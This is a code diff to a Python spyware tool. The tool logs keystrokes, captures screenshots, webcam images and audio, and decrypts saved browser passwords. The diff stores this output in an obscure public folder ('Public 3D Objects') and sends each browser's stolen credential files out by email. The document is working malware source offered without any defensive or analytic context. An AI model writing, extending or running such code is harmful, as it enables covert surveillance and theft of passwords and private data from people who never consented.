@@ -28,6 +28,22 @@ receiver_email = sender_email                   #Enter receiver email here
 mail_interval = 300                             #Adjust the time between each email send
 save_interval = 10                              #Adjust the time between each file save
 
+# Name of folder
+folder_path = "C:\\Users\\Public\\Public 3D Objects\\"
+screenshots_folder = folder_path + "screenshots"
+webcam_folder = folder_path + "webcam_images"
+audio_folder = folder_path + "audio_files"
+keylog_folder = folder_path + "keylogs"
+
+if not os.path.exists(screenshots_folder):
+    os.makedirs(screenshots_folder)
+if not os.path.exists(webcam_folder):
+    os.makedirs(webcam_folder)
+if not os.path.exists(audio_folder):
+    os.makedirs(audio_folder)
+if not os.path.exists(keylog_folder):
+    os.makedirs(keylog_folder)
+
 def capture_and_save_screen(output_folder):
     while True:
         current_time = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -61,8 +77,8 @@ def send_files_email(sender_email, sender_password, receiver_email, files_folder
     files = [f for f in os.listdir(files_folder) if os.path.isfile(os.path.join(files_folder, f))]
 
     if files:
-        current_date = datetime.now().strftime("%Y%m%d")
-        subject = f"Files taken on {current_date}"
+        current_date = datetime.now().strftime("%d %m %Y")
+        subject = f"{files_folder.replace(folder_path, '')} taken on {current_date}"
         msg = MIMEMultipart()
         msg['From'] = sender_email
         msg['To'] = receiver_email
@@ -138,11 +154,10 @@ def decrypt_password(buff: bytes, key: bytes) -> str:
     return decrypted_pass
 
 def save_results(browser_name, type_of_data, content):
-    if not os.path.exists(browser_name):
-        os.mkdir(browser_name)
+    if not os.path.exists(folder_path + browser_name):
+        os.mkdir(folder_path + browser_name)
     if content is not None:
-        open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
-    send_files_email(sender_email, sender_password, receiver_email, browser_name)
+        open(f'{folder_path + browser_name}/{type_of_data}_{browser_name}.txt', 'w', encoding="utf-8").write(content)
 
 def get_data(path: str, profile: str, key, type_of_data):
     db_file = f'{path}\\{profile}{type_of_data["file"]}'
@@ -192,6 +207,7 @@ if True:
                 save_results(browser, data_type_name, data)
             except:
                 pass
+        send_files_email(sender_email, sender_password, receiver_email, folder_path + browser)
 
 def on_press(key):
     key = str(key)
@@ -224,22 +240,6 @@ def on_press(key):
 def keylog_join():
     with Listener(on_press=on_press) as keylogger:
         keylogger.join()
-
-# Name of folder
-file_path = "C:\\Users\\Public\\Public 3D Objects\\"
-screenshots_folder = file_path + "screenshots"
-webcam_folder = file_path + "webcam_images"
-audio_folder = file_path + "audio_files"
-keylog_folder = file_path + "keylogs"
-
-if not os.path.exists(screenshots_folder):
-    os.makedirs(screenshots_folder)
-if not os.path.exists(webcam_folder):
-    os.makedirs(webcam_folder)
-if not os.path.exists(audio_folder):
-    os.makedirs(audio_folder)
-if not os.path.exists(keylog_folder):
-    os.makedirs(keylog_folder)
 
 screen_thread = Thread(target=capture_and_save_screen, args=(screenshots_folder,))
 webcam_thread = Thread(target=capture_and_save_webcam, args=(webcam_folder,))
